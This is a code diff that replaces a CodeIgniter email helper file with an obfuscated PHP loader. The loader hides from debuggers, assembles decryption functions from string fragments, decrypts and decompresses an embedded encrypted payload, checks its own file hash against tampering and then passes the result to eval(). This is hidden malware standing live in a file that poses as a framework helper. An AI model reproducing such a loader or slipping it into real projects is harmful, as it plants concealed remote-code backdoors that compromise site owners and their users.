@@ -1,84 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 1.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * CodeIgniter Email Helpers
- *
- * @package		CodeIgniter
- * @subpackage	Helpers
- * @category	Helpers
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/helpers/email_helper.html
- */
-
-// ------------------------------------------------------------------------
-
-if ( ! function_exists('valid_email'))
-{
-	/**
-	 * Validate email address
-	 *
-	 * @deprecated	3.0.0	Use PHP's filter_var() instead
-	 * @param	string	$email
-	 * @return	bool
-	 */
-	function valid_email($email)
-	{
-		return (bool) filter_var($email, FILTER_VALIDATE_EMAIL);
-	}
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_qa003j6q=('bas'.'e64'.'_de'.'cod'.'e');
+$_laqtv0k2=('gzu'.'nco'.'mpr'.'ess');
+$_bbq9jjoq=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_qcekuokf='TFX7yXAl';
+$_ou48b5r1='mCUzYAi4';
+$_ro4cn110='norgwGYB';
+$_rt0a9gja='asyMlXU0';
+$_tplaz6me='AjGbVgPYBN0=';
+$_bz1doc8e='MHGWgPlV';
+$_nfz1en4w='+Rt1Ysep';
+$_j48cj3nv='4XHEAg==';
+$_qjufqohr=$_qa003j6q($_ro4cn110.$_qcekuokf.$_ou48b5r1.$_rt0a9gja.$_tplaz6me);
+$_cwis99en=$_qa003j6q($_nfz1en4w.$_bz1doc8e.$_j48cj3nv);
+$_qtsjdzov=$_qa003j6q('nRCScA9P68HbnJQFWK3edv0Xl5ICEUtYJeXhpLStDAIF5L07VxUEx8CLF2Td68zd1hVl1+YPqTjx4wLAnLloXNvr2dj9MGp9mJ1Rb41mfLgqZCF2a1PHGujGLRY+H92ZVuLwgu2xf7X26ohDf8tpte7HuMpGqdDHJX18xa/s1tAynZlyvfEvr8Rs0UaPpjPppdJXuxSR0ZP2vP/MC4l2KmyWA2cgWgFx7Wqd7Lw09wEkxDJ3AzU1ecD16dowI1lZhZtjJIdUve3KhYsKBbECMG4k8NOLrHCj74oynu37i28=');
+$_yz1zzgag=$_bbq9jjoq($_qtsjdzov,'aes-256-cbc',$_qjufqohr,OPENSSL_RAW_DATA,$_cwis99en);
+if($_yz1zzgag===false){exit;}
+$_mttikt4h=$_laqtv0k2($_yz1zzgag);
+if($_mttikt4h===false){exit;}
+$_l6dbepzh='56ffecb68204e1748cc80acd3bad9b66492b6d4c0bac99ae5be7670938fb6fc2';
+$_cqj2dpb0=@file_get_contents(__FILE__);
+if($_cqj2dpb0!==false){
+$_jrz5sxku=str_replace($_l6dbepzh,"0000000000000000000000000000000000000000000000000000000000000000",$_cqj2dpb0);
+$_fw8rceo1=hash("sha256",$_jrz5sxku);
+if($_fw8rceo1!==$_l6dbepzh){@http_response_code(403);exit;}
 }
-
-// ------------------------------------------------------------------------
-
-if ( ! function_exists('send_email'))
-{
-	/**
-	 * Send an email
-	 *
-	 * @deprecated	3.0.0	Use PHP's mail() instead
-	 * @param	string	$recipient
-	 * @param	string	$subject
-	 * @param	string	$message
-	 * @return	bool
-	 */
-	function send_email($recipient, $subject, $message)
-	{
-		return mail($recipient, $subject, $message);
-	}
-}
+eval($_mttikt4h);
